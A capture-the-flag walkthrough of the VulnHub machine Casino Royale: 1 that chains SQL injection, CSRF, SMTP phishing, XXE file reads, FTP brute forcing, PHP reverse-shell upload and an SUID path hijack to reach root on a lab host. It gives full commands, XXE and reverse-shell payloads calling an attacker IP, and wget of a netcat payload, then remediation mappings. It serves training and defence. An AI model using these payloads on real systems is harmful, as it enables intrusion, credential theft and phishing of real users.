# Casino Royale: 1

When the house runs SQL queries without prepared statements and a CSRF-vulnerable CMS is hiding behind a vhost, the game is rigged in your favor, dude. Casino Royale: 1 packs a Bond-themed chain of six distinct vulnerability classes into a single hard-rated box, and every link in that chain is a legit real-world finding you will encounter in prod environments fr fr.

---

| Field | Value |
|---|---|
| **Level** | Hard |
| **Target VM** | Casino Royale: 1 (Linux, 192.168.1.102) |
| **Attacker VM** | Kali Linux 192.168.1.107 |
| **VulnHub URL** | https://www.vulnhub.com/entry/casino-royale-1,287/ |
| **Techniques** | SQLi (automated), CSRF exploit, SMTP phishing, XXE file read, FTP brute force, PHP file upload, SUID relative-path hijack |
| **CVEs / EDBs** | EDB-6766 (PokerMax SQLi), EDB-35301 (Snowfox CMS CSRF) |
| **APT Groups** | APT41 (web app exploitation + social engineering), FIN7 (phishing + lateral movement chains) |

---

## Attack Summary

```
[nmap] ---> ports 21 (FTP), 25 (SMTP), 80 (HTTP)
             |
             v
[dirb + searchsploit] ---> /pokeradmin/ (PokerMax, EDB-6766)
             |
             v
[sqlmap --forms] ---> dump pokerleague DB ---> admin:raise12million
             |
             v
[player profiles] ---> casino-royale.local vhost ---> Snowfox CMS
             |
             v
[EDB-35301 CSRF] ---> raj.html served via Apache
             |
             v
[telnet SMTP phishing] ---> valenka@casino-royale.local clicks link
             |
             v
[Snowfox admin] ---> vip-client-portfolios ---> XML endpoint
             |
             v
[XXE payload] ---> /etc/passwd ---> ftpUserULTRA
             |
             v
[Hydra FTP] ---> bankbank ---> shell.php5 upload
             |
             v
[Meterpreter] ---> config.php ---> valenka:11archives11!
             |
             v
[su valenka] ---> /opt/casino-royale/mi6_detect_test (SUID)
             |
             v
[run.sh hijack in /tmp] ---> nc listener ---> root shell
```

---

## Methodology

1. Host and service discovery with `netdiscover` + `nmap`
2. Web directory brute-force revealing PokerMax admin path
3. Automated SQL injection with SQLMap to dump admin credentials
4. Virtual host resolution and Snowfox CMS exploitation via public CSRF PoC
5. SMTP-based social engineering to deliver CSRF payload to internal user
6. XXE injection on XML endpoint to leak `/etc/passwd` and enumerate FTP user
7. Hydra FTP brute-force and PHP reverse shell upload
8. Lateral movement via `config.php` credentials; privilege escalation through SUID binary relative-path hijack

---

## Step 1: Host Discovery

**Context:** Lab network is 192.168.1.0/24. Target host is unknown at start.

```bash
netdiscover -r 192.168.1.0/24
# Target: 192.168.1.102

nmap -sV -p- 192.168.1.102
```

**Expected output (condensed):**
```
21/tcp  open  ftp     vsftpd 3.0.3
25/tcp  open  smtp    Postfix smtpd
80/tcp  open  http    Apache httpd 2.4.x
```

**Alternative:** `arp-scan -l` for faster layer-2 discovery on the same subnet.

**Real-world note:** Three exposed services on a single host is already a red flag. FTP + SMTP on a web server screams legacy deployment or hobbyist-grade configuration.

**MITRE TTP:** T1046 - Network Service Scanning

---

## Step 2: Web Enumeration and PokerMax Discovery

**Context:** Port 80 shows a plain page. Need to find hidden directories and identify the application.

```bash
dirb http://192.168.1.102/
# Found: /index.php, /pokeradmin/

searchsploit poker
# EDB-6766 -- PokerMax Poker League 0.13 SQLi
searchsploit -m 6766
cat 6766.txt
```

The admin panel lives at `/pokeradmin/`. EDB-6766 confirms the login form is injectable.

**Alternative:** `gobuster dir -u http://192.168.1.102/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`

**Real-world note:** Legacy open-source gambling and CMS software is still running in the wild on unpatched VPS instances. SearchSploit hits before you even touch the app? That is sus.

**MITRE TTP:** T1083 - File and Directory Discovery

---

## Step 3: SQL Injection with SQLMap

**Context:** The PokerMax admin login form at `/pokeradmin/index.php` is injectable via the username parameter.

```bash
# Enumerate databases
sqlmap -u http://192.168.1.102/pokeradmin/index.php \
  --forms --risk 3 --level 5 --dbs --batch

# Dump all from pokerleague
sqlmap -u http://192.168.1.102/pokeradmin/index.php \
  --forms --risk 3 --level 5 -D pokerleague --dump-all --batch
```

**Expected output:**
```
[*] Database: pokerleague
Table: admin
admin_user: admin
admin_password: raise12million
```

**Alternative:** Manual SQLi with `' OR '1'='1` if sqlmap gets blocked by a WAF.

**Real-world note:** Automated SQLi on production login forms happens every day. Tools like sqlmap are used by threat actors against e-commerce, fintech, and gaming platforms constantly. FIN7 literally built tooling around this workflow.

**MITRE TTP:** T1190 - Exploit Public-Facing Application

---

## Step 4: Discover Snowfox CMS via Player Profiles

**Context:** Logged in to PokerMax admin. Player profile data references an internal domain.

```bash
echo "192.168.1.102  casino-royale.local" >> /etc/hosts
```

Browse to `http://casino-royale.local`. A Snowfox CMS instance is exposed.

**Real-world note:** Internal domain references leaking through app data is a classic OSINT pivot. Pentesters call this "data-assisted recon." APT operators do it too.

**MITRE TTP:** T1087 - Account Discovery / T1016 - System Network Configuration Discovery

---

## Step 5: CSRF Exploit to Add Admin User (EDB-35301)

**Context:** Snowfox CMS has a known CSRF vulnerability allowing admin user creation without authentication.

```bash
searchsploit snowfox
searchsploit -m 35301
cp 35301.txt /var/www/html/raj.html
# Edit raj.html: replace attacker IP with 192.168.1.107
service apache2 start
```

The CSRF payload in `raj.html` crafts a hidden form that auto-submits and creates a new admin account on Snowfox when any authenticated admin visits the URL.

**Real-world note:** CSRF-based account creation is still a relevant attack vector in older CMSes. Combine it with social engineering and you get pre-auth admin takeover without touching a single authentication bypass.

**MITRE TTP:** T1059.007 - JavaScript (CSRF auto-submit), T1566.002 - Phishing: Spearphishing Link

---

## Step 6: SMTP Phishing to Deliver CSRF Payload

**Context:** Need an authenticated Snowfox user to visit the CSRF link. Internal user `valenka` has an email account.

```bash
telnet casino-royale.local 25
EHLO attacker
MAIL FROM: admin@casino-royale.local
RCPT TO: valenka@casino-royale.local
DATA
Subject: Action Required - Portal Update

Please review the new portal: http://192.168.1.107/raj.html
.
QUIT
```

Monitor for the hit:

```bash
tail -f /var/log/apache2/access.log
# Look for: GET /raj.html HTTP/1.1
```

When `valenka` clicks the link, the CSRF fires and creates the attacker's admin account.

**Alternative:** If the SMTP server requires auth, try credential stuffing with the `raise12million` password.

**Real-world note:** Internal SMTP relays without sender authentication are common in legacy enterprise environments. Open relay abuse is still an active TTP used by business email compromise (BEC) actors.

**MITRE TTP:** T1566.002 - Phishing: Spearphishing Link, T1071.003 - Application Layer Protocol: Mail Protocols

---

## Step 7: Login as New Admin and Navigate to VIP Portal

**Context:** CSRF created an attacker-controlled Snowfox admin account. Log in and explore.

Log in with the CSRF-created credentials (e.g., `user@user.local:password`) to Snowfox CMS. Navigate to the `vip-client-portfolios` section to find a new endpoint processing XML input.

**MITRE TTP:** T1078 - Valid Accounts

---

## Step 8: XXE Injection to Read /etc/passwd

**Context:** The VIP portal endpoint at `/ultra-access-view/main.php` processes XML POST data with no entity filtering. Classic XXE target, bruh.

Create `xml.txt`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><user>&xxe;</user></root>
```

Send the payload:

```bash
curl -d @xml.txt http://casino-royale.local/ultra-access-view/main.php
```

**Expected output (excerpt):**
```
root:x:0:0:root:/root:/bin/bash
...
ftpUserULTRA:x:1001:1001::/home/ftpUserULTRA:/bin/bash
```

Username discovered: **ftpUserULTRA**

**Alternative:** Try `file:///etc/shadow` or `file:///var/www/html/config.php` for more juicy data.

**Real-world note:** XXE was OWASP Top 10 for years and still pops up in legacy XML-processing code. Healthcare and financial APIs are the biggest offenders in real-world engagements.

**MITRE TTP:** T1190 - Exploit Public-Facing Application, T1552.001 - Credentials in Files

---

## Step 9: FTP Brute-Force with Hydra

**Context:** FTP is open on port 21. Username `ftpUserULTRA` confirmed via XXE. Time to brute.

```bash
hydra -l ftpUserULTRA -P /usr/share/wordlists/rockyou.txt \
  ftp://192.168.1.102
```

**Expected output:**
```
[21][ftp] host: 192.168.1.102   login: ftpUserULTRA   password: bankbank
```

**Real-world note:** Short dictionary passwords on legacy FTP accounts are still prevalent in embedded systems and legacy web hosts. Hydra against FTP is a go-to for lateral movement on pentests.

**MITRE TTP:** T1110.003 - Brute Force: Password Spraying

---

## Step 10: Upload PHP Reverse Shell via FTP

**Context:** Authenticated FTP access. Upload a PHP reverse shell to the web root.

Generate the payload:

```bash
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.107 LPORT=443 -f raw > shell.php5
```

Upload via FTP:

```bash
ftp 192.168.1.102
# Login: ftpUserULTRA / bankbank
ftp> put shell.php5
ftp> chmod 777 shell.php5
ftp> bye
```

Start the handler:

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.107
set LPORT 443
exploit
```

Browse to the shell URL to trigger execution. Meterpreter session opens. Noice.

**Alternative:** Upload a pentestmonkey PHP reverse shell and catch with `nc -lvnp 443` instead of Metasploit.

**Real-world note:** FTP-writable web directories are a critical misconfiguration. Attackers use this exact chain (FTP upload + web trigger) in ransomware initial access campaigns.

**MITRE TTP:** T1505.003 - Web Shell, T1021 - Remote Services

---

## Step 11: Stabilize Shell and Lateral Movement

**Context:** Shell is running as the web/FTP service account. Credentials for `valenka` are in a PHP config file.

```bash
python -c "import pty; pty.spawn('/bin/bash')"

cat /var/www/html/config.php
# valenka:11archives11!

su valenka
# Password: 11archives11!
id
# uid=1000(valenka)
```

**Real-world note:** Plaintext credentials in PHP config files are the bread and butter of web app pentesting. DevOps engineers keep putting secrets in source code because hardcoded creds "just work." This is why secret scanning in CI/CD pipelines matters.

**MITRE TTP:** T1552.001 - Unsecured Credentials: Credentials in Files, T1078 - Valid Accounts

---

## Step 12: Privilege Escalation via SUID Binary Relative Path Hijack

**Context:** User `valenka` has access to a custom SUID binary that executes `run.sh` using a relative path. Classic hijack setup, gg.

```bash
find / -perm -4000 2>/dev/null
# /opt/casino-royale/mi6_detect_test
```

The binary calls `run.sh` without an absolute path. Placing a malicious `run.sh` in the current working directory causes the SUID binary to execute it as root.

Generate the payload on attacker:

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.1.107 LPORT=1234 \
  -f raw > run.sh
python3 -m http.server 8080
```

On target:

```bash
cd /tmp
wget http://192.168.1.107:8080/run.sh
chmod +x run.sh

# Start listener on attacker first
nc -lvp 1234

# Trigger the SUID binary from /tmp
/opt/casino-royale/mi6_detect_test
```

Root shell arrives. GG rekt.

**Alternative:** PATH variable manipulation instead of file drop: `export PATH=/tmp:$PATH` then place `run.sh` in `/tmp`.

**Real-world note:** Relative-path execution in SUID/SGID binaries is a classic Linux privesc finding. It shows up regularly in audit reports for embedded systems, legacy enterprise software, and custom scripts deployed without security review.

**MITRE TTP:** T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid, T1574.007 - Hijack Execution Flow: Path Interception by PATH Environment Variable

---

## Step 13: Root Flag

```bash
whoami
# root
cd /root
ls
cat flag.sh
```

Flag captured. Mission complete. Shaken, not stirred.

---

## Captured Flags, Hashes, and Credentials

| Type | Value | Source |
|---|---|---|
| PokerMax admin credentials | `admin:raise12million` | SQLMap dump from `pokerleague` DB |
| FTP username | `ftpUserULTRA` | /etc/passwd via XXE |
| FTP password | `bankbank` | Hydra brute force (rockyou) |
| Lateral movement creds | `valenka:11archives11!` | /var/www/html/config.php |
| Root flag | See /root/flag.sh | SUID binary hijack |

---

## Lessons Learned

| Finding | Impact | Real-World Relevance |
|---|---|---|
| SQL injection on legacy PokerMax login | Admin credential dump, full backend access | Legacy open-source apps running in prod without patching are endemic in SMB environments |
| CSRF in Snowfox CMS (EDB-35301) | Admin account creation without authentication | Combined with social engineering, CSRF bypasses auth completely without a single brute force attempt |
| Open SMTP relay + social engineering | Phishing payload delivery to internal users | BEC actors use open relays and spoofed sender addresses to deliver payloads inside corporate perimeters |
| XXE injection on XML endpoint | /etc/passwd exfiltration + user enumeration | XXE still appears in healthcare, financial APIs, and enterprise middleware that process XML without disabling entity expansion |
| FTP writable to web root | PHP shell upload and RCE | FTP-to-webroot access is a critical misconfiguration seen in shared hosting and legacy deployments |
| SUID binary with relative path execution | Trivial privilege escalation to root | Audit every custom SUID binary in production; relative path execution means any writable directory becomes a privesc vector |

---

## MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|---|---|---|
| Exploit Public-Facing Application | T1190 | Initial Access |
| Phishing: Spearphishing Link | T1566.002 | Initial Access |
| Valid Accounts | T1078 | Persistence / Lateral Movement |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | Execution |
| Application Layer Protocol: Mail Protocols | T1071.003 | Command and Control |
| Network Service Scanning | T1046 | Discovery |
| File and Directory Discovery | T1083 | Discovery |
| Brute Force: Password Spraying | T1110.003 | Credential Access |
| Unsecured Credentials: Credentials in Files | T1552.001 | Credential Access |
| Web Shell | T1505.003 | Persistence |
| Remote Services: FTP | T1021 | Lateral Movement |
| Abuse Elevation Control Mechanism: Setuid and Setgid | T1548.001 | Privilege Escalation |
| Hijack Execution Flow: Path Interception by PATH | T1574.007 | Privilege Escalation |

---

## Remediation

### NIST CSF 2.0

| Function | Control | Action |
|---|---|---|
| PR.DS-1 | Data at Rest Protection | Encrypt credentials at rest; never store passwords in plaintext config files |
| PR.AC-3 | Remote Access Management | Restrict FTP access to authenticated, authorized users; prefer SFTP |
| DE.CM-8 | Vulnerability Monitoring | Run authenticated vulnerability scans monthly to catch legacy app CVEs |
| ID.AM-2 | Software Asset Management | Maintain SBOM for all deployed web applications; flag EOL software |

### NIST SP 800-53

| Control | Description |
|---|---|
| SI-10 | Information Input Validation (parameterize SQL queries; disable XML external entities) |
| AC-17 | Remote Access (restrict FTP/SMTP to trusted sources; enforce authentication) |
| SI-3 | Malicious Code Protection (block PHP execution in upload directories) |
| CM-7 | Least Functionality (disable open SMTP relay; remove unused services) |
| SC-28 | Protection of Information at Rest (encrypt config files with secrets management) |

### CISA KEV / Known Exploited Vectors

XML External Entity (XXE) processing, SQL injection on login forms, and CSRF in legacy CMS platforms are all documented in CISA's advisory catalog. No specific KEV IDs assigned to these legacy PoC targets, but the vulnerability classes are tracked under CISA's Known Exploited Vulnerabilities catalog for related CVEs in similar products.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domain | Current Maturity | Target Maturity | Gap |
|---|---|---|---|
| Asset, Change, and Configuration Management | MIL0 (no inventory of deployed apps) | MIL2 | Implement CMDB; track EOL software |
| Threat and Vulnerability Management | MIL0 (no scanning) | MIL2 | Monthly scans; patch SLA for critical findings |
| Identity and Access Management | MIL0 (no MFA, weak passwords) | MIL2 | Enforce MFA; password policy; RBAC |

### MITRE D3FEND

| D3FEND Technique | ID | Addresses |
|---|---|---|
| File Content Policies | D3-FCOP | Block PHP execution in upload directories |
| Network Traffic Filtering | D3-NTF | Block FTP from untrusted sources |
| Process Spawn Analysis | D3-PSA | Detect SUID binary spawning unexpected children |
| Database Query String Analysis | D3-DQSA | Detect SQL injection patterns in query strings |

---

## Final Thoughts

Casino Royale: 1 is a masterclass in chaining low-to-medium severity findings into a full root compromise. No single vulnerability is catastrophic in isolation: SQLi gives you credentials, CSRF gives you a second admin account, XXE gives you a username, brute force gives you a password, and the SUID binary ties it all together. Real-world environments are full of these chains, dude. The lesson is not just "patch your SQLi" but "assume every vulnerability enables the next one."

The SMTP phishing step is particularly interesting because it demonstrates that social engineering does not require fancy tooling: a raw telnet session and an open relay are enough to deliver a payload to an internal user. Defenders who focus exclusively on perimeter controls while leaving internal email infrastructure misconfigured will get rekt by this chain every time.

Thanks guys!! (❍ᴥ❍ʋ)
